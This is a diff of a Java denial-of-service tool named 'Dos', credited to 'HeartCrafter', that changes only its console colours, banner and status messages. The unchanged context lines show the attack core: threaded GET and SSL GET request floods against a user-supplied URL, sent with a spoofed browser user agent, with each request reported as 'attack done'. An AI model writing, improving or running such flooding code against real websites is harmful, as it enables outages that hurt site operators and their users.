@@ -10,10 +10,14 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class Dos implements Runnable {
     private final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
-    private static final String GREEN = "\033[0;32m";
     private static final String RED = "\033[0;31m";
+    private static final String WHITE = "\033[0;97m";
+    private static final String BLUE = "\033[0;34m";
+    private static final String GREEN = "\033[0;32m";
+    private static final String YELLOW = "\033[0;33m";
     private static final String RESET = "\033[0m";
 
+    
     private static int amount = 0;
     private static String url = "";
     private static int successfulRequests = 0;
@@ -97,8 +101,8 @@ public class Dos implements Runnable {
         "╰╯╱╰┻━━┻╯╰┻╯╰━┻━━━┻╯╰╯╰╯╰╯╰━┻━━┻╯\n";
         
         System.out.println(banner);
-        System.out.println("\n            Made By HeartCrafter             ");
-        System.out.println("\n            t.me/heartcrafter            ");
+        System.out.println(WHITE + "\n            Made By HeartCrafter             " + RESET);
+        System.out.println(GREEN + "\n             t.me/heartcrafter            " + RESET);
     }
 
     private static boolean isValidURL(String url) {
@@ -136,7 +140,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode + " Connected to website");
+        printStatus(responseCode, " Website is Alive! ");
         Dos.url = url;
     }
 
@@ -148,7 +152,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode + " Connected to website");
+        printStatus(responseCode , " Website is Alive! ");
         Dos.url = url;
     }
 
@@ -159,7 +163,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode + " GET attack done! Thread: " + this.seq);
+        printStatus(responseCode , " GET attack done! Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -169,7 +173,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode + "SSL GET attack done! Thread: " + this.seq);
+        printStatus(responseCode , " GET attack done! Thread: " + this.seq);
     }
 
     private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
@@ -197,10 +201,10 @@ public class Dos implements Runnable {
     private void printStatus(int responseCode, String message) {
         if (responseCode == 200) {
             successfulRequests++;
-            System.out.println(GREEN + message + RESET);
+            System.out.println(GREEN + "Status :" +responseCode + RESET + message );
         } else {
             failedRequests++;
-            System.out.println(RED + " (Response Code: " + responseCode + ")" + RESET);
+            System.out.println(RED + " Status: " + responseCode + RESET);
         }
     }
 
